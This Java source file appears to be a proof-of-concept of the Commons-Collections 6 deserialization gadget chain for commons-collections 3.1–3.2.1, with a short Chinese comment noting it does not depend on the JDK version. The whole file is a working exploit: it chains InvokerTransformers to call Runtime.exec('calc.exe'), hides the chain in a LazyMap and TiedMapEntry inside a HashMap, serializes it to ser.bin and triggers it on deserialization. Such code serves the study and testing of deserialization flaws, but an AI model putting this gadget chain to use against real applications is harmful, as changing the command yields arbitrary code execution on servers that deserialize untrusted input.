import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        /**
         * commons-collections-3.1-3.2.1
         *
         * 不依赖 jdk 中的内置函数(也就是说不依赖jdk版本)
         */
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(1)); //return new LazyMap(map, factory);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
        HashMap<Object,Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry,"test");
        lazyMap.remove("aaa");

        Class c = LazyMap.class;
        Field field = c.getDeclaredField("factory");
        field.setAccessible(true);
        field.set(lazyMap,chainedTransformer);
        serialize(hashMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
